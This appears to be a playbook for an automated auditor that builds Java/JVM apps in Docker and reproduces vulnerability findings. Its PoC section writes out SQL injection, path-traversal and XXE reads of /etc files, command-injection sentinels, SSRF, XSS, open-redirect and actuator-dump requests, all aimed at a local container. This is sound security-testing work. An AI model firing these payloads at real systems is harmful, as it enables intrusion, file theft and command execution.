# ENV Playbook — Java / JVM

Build, run, and exploit a Java / JVM target (Spring Boot / Spring MVC / Jakarta
EE / Quarkus / Micronaut / Dropwizard / plain Maven or Gradle library, or a
Kotlin/Scala/Groovy app) to reproduce a candidate finding with a real PoC.
Docker-first; the native JDK / Maven / Gradle toolchain may be absent on the
host. Keep ALL traffic inside the local container — no external hosts, no real
credentials, no data exfiltration.

Conventions used below (substitute per finding):

- `FID` — the finding id (e.g. `f3`); use it to make names/ports unique so
  parallel repros never collide.
- `WT=/tmp/va-$FID` — isolated git worktree path.
- `IMG=va-$FID:repro` — image tag. `CN=va-$FID` — container name.
- `PORT` — an ephemeral host port (pick a free one, see Run & health-check).
- The final repro result must set `method` to one of:
  `live-exploit | unit-test | build-only | static-poc`.

---

## 1. Detect

Confirm the stack from the target tree (read-only):

```sh
ls pom.xml build.gradle build.gradle.kts settings.gradle settings.gradle.kts \
   gradlew mvnw Dockerfile docker-compose.yml 2>/dev/null
find . -maxdepth 4 \( -name '*.java' -o -name '*.kt' -o -name '*.scala' \
   -o -name '*.groovy' \) -not -path '*/target/*' -not -path '*/build/*' | head
```

- **Build tool / manifest:**
  - `pom.xml` → **Maven**. The `<build>` `<plugins>` and `<parent>` reveal the
    framework (`spring-boot-starter-parent`, `quarkus-maven-plugin`). Modules are
    declared in `<modules>`; a multi-module repo has a root `pom.xml` plus
    per-module `pom.xml`.
  - `build.gradle` (Groovy DSL) or `build.gradle.kts` (Kotlin DSL) → **Gradle**.
    `settings.gradle[.kts]` lists sub-projects (`include 'a', 'b'`).
- **Wrapper present?** `./mvnw` / `./gradlew` pin the exact build-tool version —
  prefer them over a system `mvn`/`gradle` for reproducibility.
- **JDK version** — match the image to it. Read it from the manifest:

  ```sh
  grep -iE 'java\.version|maven\.compiler|<release>|<source>|<target>' pom.xml 2>/dev/null
  grep -iE 'sourceCompatibility|targetCompatibility|JavaLanguageVersion|languageVersion' \
    build.gradle build.gradle.kts 2>/dev/null
  cat .sdkmanrc .tool-versions 2>/dev/null
  ```

- **Framework tells** (dependencies in the manifest, or `@SpringBootApplication`
  / annotations):
  - Spring Boot → `spring-boot-starter*`; entry is a `@SpringBootApplication`
    `main`, packaged as an executable fat-jar. Default port **8080**.
  - Spring MVC (classic WAR) → `spring-webmvc` + a `web.xml` / `WEB-INF`;
    deployed to Tomcat/Jetty. Produces a `*.war`.
  - Quarkus → `quarkus-*`; runs `java -jar quarkus-app/quarkus-run.jar`, port
    **8080**.
  - Micronaut → `io.micronaut*`, port **8080**. Dropwizard → `io.dropwizard`,
    app port **8080**, admin **8081**.
  - Jakarta/Java EE → packaged `*.war`/`*.ear`, needs an app server
    (Tomcat/WildFly/Payara). Heaviest to run live → consider Fallbacks.
  - Library / SDK (no framework, no `main`, packaging `jar`) → nothing to serve;
    go to Fallbacks and drive the sink from a JUnit test (`method: unit-test`).
- **Entry point & packaging** — ground truth for how it runs:

  ```sh
  grep -rl '@SpringBootApplication\|public static void main' \
    --include='*.java' --include='*.kt' src 2>/dev/null | head
  grep -iE '<packaging>|spring-boot-maven-plugin|application\b|mainClass' \
    pom.xml build.gradle build.gradle.kts 2>/dev/null
  ```

  `<packaging>jar</packaging>` (or default) + the Spring Boot / Shadow / Shadow
  plugin → an executable fat-jar (`java -jar`). `<packaging>war</packaging>` →
  needs a servlet container.

---

## 2. Isolate

Work in a throwaway git worktree at the target ref so the original tree is
never touched. From inside the target repo:

```sh
REF=<commit-or-branch>            # the ref under audit; default HEAD
git -C <target> worktree add --detach /tmp/va-$FID "$REF"
cd /tmp/va-$FID
```

If `<target>` is not a git repo (rare), `cp -a <target> /tmp/va-$FID` instead
and note it. All build/run steps below run from `WT=/tmp/va-$FID`.

Keep the build context lean and out of the host's reach — never copy stale build
output (`target/`, `build/`) into the image; let the container build fresh. The
`.dockerignore` keeps it out of the context:

```sh
printf '.git\ntarget\nbuild\n.gradle\n*.class\n' > /tmp/va-$FID.dockerignore
```

---

## 3. Build & run (docker-first)

The JVM compile step is heavy and pulls many dependencies. Use BuildKit cache
mounts (or a mounted local repo) so re-runs are fast, and prefer the wrapper to
pin the build-tool version.

### 3a. If the repo ships its own Docker

Prefer the project's own definition — it usually wires up the build, the correct
fat-jar / WAR, the JVM flags, env, and the DB for you.

```sh
# Compose (opportunistic — the plugin may be missing):
docker compose version >/dev/null 2>&1 && \
  docker compose -p va-$FID up -d --build

# Otherwise plain docker with the repo Dockerfile (the reliable path):
docker build -t $IMG .
```

### 3b. No Dockerfile — minimal generic image

Pick the JDK tag from step 1 (fall back to a recent LTS, e.g. `eclipse-temurin`
**21**; use **17** or **11** if the manifest targets an older release — a newer
JDK can reject old source/bytecode). A multi-stage build compiles in a JDK image
and runs the artifact on a smaller JRE.

**Maven** (uses the wrapper if present, else the `maven` image):

```sh
cat > /tmp/Dockerfile.$FID <<'EOF'
# --- build stage ---
FROM maven:3.9-eclipse-temurin-21 AS build
WORKDIR /src
# Copy manifests first for dependency-layer caching.
COPY pom.xml ./
COPY .mvn/ .mvn/ 2>/dev/null
COPY mvnw* ./
# Pre-fetch deps offline-friendly (cache mount keeps re-runs fast).
RUN --mount=type=cache,target=/root/.m2 \
    mvn -B -ntp -q dependency:go-offline || true
COPY . .
# Skip tests for the repro build (the audited code, not its test suite, matters).
RUN --mount=type=cache,target=/root/.m2 \
    mvn -B -ntp -DskipTests package
# --- run stage ---
FROM eclipse-temurin:21-jre
WORKDIR /app
# Spring Boot / Shadow fat-jar: grab the executable jar (excludes *-sources / *-plain).
COPY --from=build /src/target/*.jar /app/app.jar
EXPOSE 8080
ENTRYPOINT ["java","-jar","/app/app.jar"]
EOF

DOCKER_BUILDKIT=1 docker build -f /tmp/Dockerfile.$FID \
  --iidfile /tmp/va-$FID.iid -t $IMG "$WT"
```

**Gradle** (swap the build stage):

```sh
# FROM gradle:8-jdk21 AS build
# WORKDIR /src
# COPY . .
# RUN --mount=type=cache,target=/home/gradle/.gradle \
#     gradle --no-daemon clean bootJar -x test   # or: shadowJar / build -x test
# # run stage:
# COPY --from=build /src/build/libs/*.jar /app/app.jar   # pick the executable jar
```

Notes that bite on JVM builds:

- A Spring Boot Maven build produces both `app.jar` (executable) and
  `app-plain.jar` (no deps). Gradle's `jar` task likewise yields a thin jar;
  the executable one is from `bootJar`/`shadowJar`. If the glob grabs the wrong
  one, `java -jar` fails with `no main manifest attribute` — copy the specific
  artifact instead.
- **WAR projects** can't `java -jar`. Either build with Spring Boot's executable
  WAR (still `java -jar`), or run a servlet container:
  `FROM tomcat:10-jre21` and `COPY target/*.war /usr/local/tomcat/webapps/ROOT.war`.
- **Spring Boot's own image build** is often easiest and reproducible:
  `./mvnw spring-boot:build-image -Dspring-boot.build-image.imageName=$IMG`
  (or `./gradlew bootBuildImage --imageName=$IMG`) — produces a runnable image
  without writing a Dockerfile. Try this first if a fat-jar copy is fiddly.

Start command, by how the project runs (the app must bind `0.0.0.0`, not
`127.0.0.1`, or the mapped host port can't reach it — Spring binds all
interfaces by default, but `server.address=127.0.0.1` in config overrides that):

- **Spring Boot / Quarkus / Micronaut / Dropwizard fat-jar:** `java -jar
  /app/app.jar` (the `ENTRYPOINT` above). Dropwizard needs the `server`
  subcommand + config: `java -jar app.jar server config.yml`.
- **WAR on a container:** the servlet container's own entrypoint serves it.
- **Library / no `main`:** nothing to serve → Fallbacks, `method: unit-test`.

---

## 4. Dependencies

Restore reproducibly from the manifest; both tools resolve transitive deps from
the declared coordinates.

```sh
# Maven — pre-fetch everything the build needs, then build offline if desired:
./mvnw -B -ntp dependency:go-offline      # or: mvn ...
./mvnw -B -ntp -o -DskipTests package     # -o = offline, uses the local repo

# Gradle — resolve dependencies, then build:
./gradlew --no-daemon dependencies        # forces resolution of all configs
./gradlew --no-daemon -x test build       # --offline once the cache is warm
```

- Honor the declared versions exactly; do **not** bump or add deps — that
  changes the audited dependency set. (Maven `versions:use-latest-releases`,
  Gradle `--refresh-dependencies` to *upgrade* — avoid both.)
- **Lockfiles** (when present): Gradle `gradle.lockfile` / `gradle/*.lockfile`
  pin exact versions — keep `--write-locks` OFF so resolution stays as audited.
  Maven has no native lockfile; the declared versions (+ any `dependencyManagement`
  / BOM) are authoritative.
- **Private/internal repos:** a `<repositories>`/`<server>` in `settings.xml` or
  a Gradle `maven { url ... }` may need auth. Out of scope — do not supply real
  credentials. If a dep can't resolve, note it and fall back.
- **JDK mismatch** is the usual build failure: a build targeting Java 21 features
  fails under JDK 17 (and vice-versa, old bytecode under a new JDK can warn or
  fail). Re-read step 1 and pick the matching `eclipse-temurin` tag.
- The BuildKit `--mount=type=cache` for `~/.m2` / `~/.gradle` makes re-builds
  fast; alternatively bind-mount a host cache:
  `-v "$HOME/.m2":/root/.m2` (read-only is safest: `:ro`).

---

## 5. Run & health-check

Pick a free ephemeral host port keyed to the finding, then run detached with a
unique name:

```sh
PORT=$(python3 -c 'import socket;s=socket.socket();s.bind(("",0));print(s.getsockname()[1]);s.close()')

docker run -d --name $CN -p 127.0.0.1:$PORT:8080 \
  -e SERVER_PORT=8080 -e SERVER_ADDRESS=0.0.0.0 \
  $IMG
```

Bind the host port to `127.0.0.1` so the app is never exposed off-box. Map the
container port (`:8080`) to whatever the code actually listens on — read it from
`application.properties` / `application.yml` (`server.port`), env, or the
framework default (Spring Boot / Quarkus / Micronaut / Dropwizard app **8080**;
Dropwizard admin **8081**; a Tomcat container **8080**). Spring honors
`SERVER_PORT` / `SERVER_ADDRESS` env (relaxed binding) — pass them if the config
hardcodes a loopback bind.

**If the app binds `127.0.0.1` inside the container** (e.g. `server.address`
config), a `-p` map can't reach it (loopback is per-namespace). Either fire the
PoC from inside the container (`docker exec $CN ...`; the temurin JRE image has a
shell), or run with `--network host` on Linux so the container's loopback is the
host's:

```sh
docker run -d --name $CN --network host $IMG    # then target 127.0.0.1:<code-port>
```

Confirm it is up — JVM apps boot slowly (cold JIT, Spring context); poll
generously, don't sleep blindly:

```sh
for i in $(seq 1 60); do
  curl -fsS -o /dev/null "http://127.0.0.1:$PORT/" && { echo up; break; }
  # Spring Boot Actuator (if on the classpath) gives a clean readiness signal:
  curl -fsS "http://127.0.0.1:$PORT/actuator/health" 2>/dev/null | grep -q UP && { echo up; break; }
  sleep 2
done
docker logs --tail 80 $CN          # inspect boot errors if curl never succeeds
```

A 404 / 401 / 403 on `/` still means the server is up — any HTTP response counts
as healthy. Look for the framework boot line in the logs (Spring's `Started
<App> in N seconds` / `Tomcat started on port(s): 8080`, Quarkus's `Listening on:
http://0.0.0.0:8080`, Micronaut's `Startup completed`). A boot that hangs is
usually a missing DB/broker dependency — see Seed, or fall back.

---

## 6. Seed

Only seed what the PoC needs; keep it minimal and synthetic.

- **DB-backed app:** Spring Boot with an embedded H2 (`spring.datasource.url=
  jdbc:h2:mem:...`) or `spring.jpa.hibernate.ddl-auto=create`/`update` creates
  the schema on boot — nothing to seed. For Flyway/Liquibase, migrations run
  automatically at startup. If it points at an external Postgres/MySQL, start a
  sidecar on the container's network and point the app at it (synthetic creds
  only):

  ```sh
  docker run -d --name va-db-$FID --network "container:$CN" \
    -e POSTGRES_PASSWORD=poc -e POSTGRES_DB=app postgres:16-alpine
  # then run with: -e SPRING_DATASOURCE_URL=jdbc:postgresql://127.0.0.1:5432/app \
  #                -e SPRING_DATASOURCE_USERNAME=postgres -e SPRING_DATASOURCE_PASSWORD=poc
  ```

  An app-shipped seed import (`data.sql`, `import.sql`, a CommandLineRunner) runs
  on boot — let it.

- **Auth flow:** if the PoC needs a session/token, register or log in via the
  app's own endpoint with synthetic creds and keep the cookie jar / capture the
  token:

  ```sh
  # Spring Security form login (cookie session):
  curl -s -c /tmp/jar.$FID -b /tmp/jar.$FID \
    -d 'username=poc&password=Poc-Passw0rd!' \
    "http://127.0.0.1:$PORT/login"

  # JSON login → JWT/bearer; capture the token for the Authorization header:
  TOKEN=$(curl -s -H 'Content-Type: application/json' \
    -d '{"username":"poc","password":"Poc-Passw0rd!"}' \
    "http://127.0.0.1:$PORT/api/auth/login" \
    | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("token") or d.get("access_token") or d.get("accessToken",""))')
  ```

  Spring Boot dev sometimes prints a generated default password to the log
  (`Using generated security password: ...`) — read it from `docker logs $CN`
  for a `user` login when no registration endpoint exists.

- Use only fake, local-only credentials. Never reuse real secrets from the repo
  beyond what is strictly required to boot.

---

## 7. Fire the PoC safely

Send the exploit to the **local** container only and capture concrete evidence.
Tailor to the finding's source→sink path; examples per class (several map to the
JVM-classic vuln families):

```sh
# SQL injection — string-concatenated JDBC / a misused JPA query; observe error
# or extracted marker:
curl -s -b /tmp/jar.$FID "http://127.0.0.1:$PORT/users?id=1%20OR%201=1--" | tee /tmp/poc.$FID.out

# Path traversal / arbitrary file read — Files.newInputStream / new File(userPath),
# or a ResourceHandler; pull a file the app should never serve:
curl -s "http://127.0.0.1:$PORT/download?file=../../../../etc/passwd" | head
# Encoded traversal that bypasses naive normalize-after-concat:
curl -s "http://127.0.0.1:$PORT/files/..%2f..%2f..%2fetc%2fpasswd" | head

# Insecure deserialization — the JVM signature class. Java native
# (ObjectInputStream), Jackson polymorphic typing, SnakeYAML, XStream, etc.
# Prove via a BENIGN in-container sentinel gadget — never a destructive payload.
# e.g. trigger a class-load / process touch you can read back:
curl -s -X POST -H 'Content-Type: application/json' \
  --data-binary @/tmp/poc-gadget.$FID.json "http://127.0.0.1:$PORT/api/import"
docker exec $CN ls -l /tmp/va-pwned 2>&1   # benign marker the gadget created

# SSTI — Thymeleaf/Freemarker/Velocity/SpEL with user-controlled template text.
# Submit an expression and observe it evaluated server-side:
# SpEL: ${T(java.lang.Runtime).getRuntime()...}  Thymeleaf: __${...}__::.x
curl -s "http://127.0.0.1:$PORT/render?name=%24%7B7*7%7D" | grep -o '49'

# XXE — XML parser without FEATURE_SECURE_PROCESSING / external-entity disabled.
# Use a LOCAL file or a container-local listener, never a remote URL:
curl -s -X POST -H 'Content-Type: application/xml' --data-binary @- \
  "http://127.0.0.1:$PORT/api/xml" <<'XML' | head
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY x SYSTEM "file:///etc/hostname"> ]>
<r>&x;</r>
XML

# OS command injection — Runtime.exec / ProcessBuilder with user input. Benign
# in-container sentinel, then read it back:
curl -s "http://127.0.0.1:$PORT/ping?host=127.0.0.1;touch%20/tmp/va-pwned"
docker exec $CN ls -l /tmp/va-pwned 2>&1

# SSRF — point at a CONTAINER-LOCAL listener you control, never a real host.
# Start a canary sharing $CN's network namespace, then make the app fetch it:
docker run -d --name va-canary-$FID --network "container:$CN" \
  python:3-slim python3 -c 'import http.server,socketserver;socketserver.TCPServer(("127.0.0.1",9999),type("H",(http.server.BaseHTTPRequestHandler,),{"do_GET":lambda s:(s.send_response(200),s.end_headers(),s.wfile.write(b"CANARY"))})).serve_forever()'
curl -s "http://127.0.0.1:$PORT/fetch?url=http://127.0.0.1:9999/" | grep -o CANARY
# 169.254.169.254 (cloud metadata) is only a payload STRING here — the request
# must stay local; never actually reach an external/metadata endpoint.

# Reflected/stored XSS — a template/response that emits user input unescaped:
curl -s "http://127.0.0.1:$PORT/profile?name=%3Cscript%3Ealert(1)%3C/script%3E" \
  | grep -o '<script>alert(1)</script>'

# Open redirect — sendRedirect / RedirectView with a user-controlled target:
curl -s -o /dev/null -D- "http://127.0.0.1:$PORT/redirect?next=https://evil.example" \
  | grep -i '^location:'   # evidence is the header value, no external request made

# Actuator exposure (Spring Boot misconfig) — sensitive endpoints reachable:
curl -s "http://127.0.0.1:$PORT/actuator/env" | head
curl -s "http://127.0.0.1:$PORT/actuator/heapdump" -o /tmp/poc.$FID.hprof && ls -l /tmp/poc.$FID.hprof
```

Evidence to record for the repro result:

- The exact request (method, path, headers, body) → `poc`.
- The response/log line proving impact (leaked row, file contents, sentinel
  file, reflected script, evaluated expression `49`, XXE-leaked file, redirect
  header, exposed actuator data, 500 with a Java stack trace) → `observed`.
- What it means for the target → `impact`. Set `reproduced: true`,
  `method: live-exploit`.

Safety invariants: traffic stays on `127.0.0.1` / inside `$CN`'s network; no
outbound connections to real hosts; no real data; deserialization / command /
SSRF payloads create only benign in-container sentinels, never destructive or
exfiltrating ones.

---

## 8. Teardown

Always clean up, even on failure (idempotent):

```sh
docker rm -f $CN va-canary-$FID va-db-$FID 2>/dev/null
docker compose -p va-$FID down -v 2>/dev/null
docker image rm -f $IMG 2>/dev/null
rm -f /tmp/jar.$FID /tmp/poc.$FID.out /tmp/poc.$FID.hprof \
      /tmp/poc-gadget.$FID.json /tmp/Dockerfile.$FID \
      /tmp/va-$FID.dockerignore /tmp/va-$FID.iid

cd /                                   # leave the worktree before removing it
git -C <target> worktree remove --force /tmp/va-$FID
git -C <target> worktree prune
```

---

## 9. Fallbacks

If a live exploit is not achievable, downgrade deliberately and set `method`
accordingly (enum: `live-exploit | unit-test | build-only | static-poc`).

1. **Won't serve but builds (library, WAR needing a full app server, or web boot
   blocked):** drive the vulnerable method directly with a JUnit test in the
   build image — the highest-fidelity non-server proof. Set `method: unit-test`.

   ```sh
   # Run the project's own focused test if one covers the sink:
   docker run --rm -v "$WT":/src -w /src maven:3.9-eclipse-temurin-21 \
     mvn -B -ntp -Dtest=VulnerableTest test
   # Gradle:
   docker run --rm -v "$WT":/src -w /src gradle:8-jdk21 \
     gradle --no-daemon test --tests '*Vulnerable*'

   # Or drop a one-off harness test that calls the vulnerable API and asserts impact.
   # Place it under src/test/java/<pkg> matching the target's package:
   cat > "$WT/src/test/java/com/example/PoCTest.java" <<'EOF'
   package com.example;
   import org.junit.jupiter.api.Test;
   import static org.junit.jupiter.api.Assertions.*;
   class PoCTest {
       @Test void poc() throws Exception {
           String out = new Vulnerable().handle("<payload>");   // call the sink
           assertTrue(out.contains("<impact-marker>"), "no impact: " + out);
           System.out.println("IMPACT: " + out);
       }
   }
   EOF
   docker run --rm -v "$WT":/src -w /src maven:3.9-eclipse-temurin-21 \
     mvn -B -ntp -Dtest=PoCTest test
   ```

   For a Spring controller that won't boot the full context, exercise it with
   `MockMvc` / `@WebMvcTest` (slice test — no real port, no network), or stand up
   the app in-process with `SpringBootTest(webEnvironment=RANDOM_PORT)` +
   `TestRestTemplate`. Still `method: unit-test`.

2. **Image builds but the app can't start (missing DB/broker/config, app-server
   dependency, private repo resolved but service deps absent):** record that the
   build succeeds (`package` produced the artifact), the dependency set resolves,
   and the vulnerable code is present and reachable, with the line-referenced
   source→sink trace as evidence. Set `method: build-only`.

   ```sh
   docker run --rm -v "$WT":/src -w /src maven:3.9-eclipse-temurin-21 \
     mvn -B -ntp -DskipTests package    # or: gradle --no-daemon assemble -x test
   ```

3. **Cannot build at all (toolchain/network blocked, unresolvable private deps,
   JDK mismatch that can't be reconciled):** construct a static PoC — the exact
   crafted input plus the line-referenced source→sink path showing why it
   triggers. Set `method: static-poc`, `reproduced: false`.

Prefer the highest-fidelity rung that actually works; never claim
`reproduced: true` without observed runtime evidence.
